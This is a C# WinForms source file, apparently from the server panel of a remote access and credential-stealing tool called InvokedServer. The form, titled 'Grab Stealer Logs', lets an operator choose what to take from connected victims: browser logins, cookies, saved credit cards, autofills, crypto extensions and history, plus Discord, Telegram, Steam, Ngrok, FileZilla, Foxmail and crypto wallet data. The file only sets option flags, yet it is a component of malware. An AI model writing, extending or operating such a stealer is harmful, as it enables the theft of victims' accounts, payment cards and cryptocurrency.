

using Guna.UI2.WinForms;
using InvokedCommon.Structs;
using InvokedServer.Helper;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;


namespace InvokedServer.Forms
{
	public partial class FrmStealerOptions : Form
	{
		private readonly int _selectedClients;

		public ChromiumBrowserOptions chromiumbrowserOptions { get; set; }

		public GeckoBrowserOptions geckobrowserOptions { get; set; }

		public AppsOptions appsOptions { get; set; }

		public FrmStealerOptions(int selected)
		{
			this._selectedClients = selected;
			this.InitializeComponent();
		}

		private void GetBrowserLogsBtn_Click(object sender, EventArgs e)
		{
			if (this.LoginsCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.Logins;
			if (this.LoginsCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.Logins;
			if (this.AutofillsCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.Autofills;
			if (this.AutofillsCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.Autofills;
			if (this.CookiesCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.Cookies;
			if (this.CookiesCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.Cookies;
			if (this.CardsCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.CreditCards;
			if (this.CardsCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.CreditCards;
			if (this.CryptoextensionsCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.CryptoExtensions;
			if (this.HistoryCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.History;
			if (this.HistoryCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.History;
			if (this.DownloadsCheckBox.Checked)
				this.chromiumbrowserOptions |= ChromiumBrowserOptions.Downloads;
			if (this.DownloadsCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.Downloads;
			if (this.AddressesCheckBox.Checked)
				this.geckobrowserOptions |= GeckoBrowserOptions.Addresses;
			if (this.DiscordCheckBox.Checked)
				this.appsOptions |= AppsOptions.Discord;
			if (this.TelegramCheckBox.Checked)
				this.appsOptions |= AppsOptions.Telegram;
			if (this.SteamCheckBox.Checked)
				this.appsOptions |= AppsOptions.Steam;
			if (this.ObsCheckBox.Checked)
				this.appsOptions |= AppsOptions.Obs;
			if (this.NgrokCheckBox.Checked)
				this.appsOptions |= AppsOptions.Ngrok;
			if (this.FilezillaCheckBox.Checked)
				this.appsOptions |= AppsOptions.Filazilla;
			if (this.FoxmailCheckBox.Checked)
				this.appsOptions |= AppsOptions.Foxmail;
			if (this.CryptoinfoCheckBox.Checked)
				this.appsOptions |= AppsOptions.Crypto;
			this.DialogResult = DialogResult.OK;
			this.Close();
		}

		private void FrmStealerOptions_Load(object sender, EventArgs e)
		{
			this.Text = WindowHelper.GetWindowTitle("Grab Stealer Logs", this._selectedClients);
		}
	}
}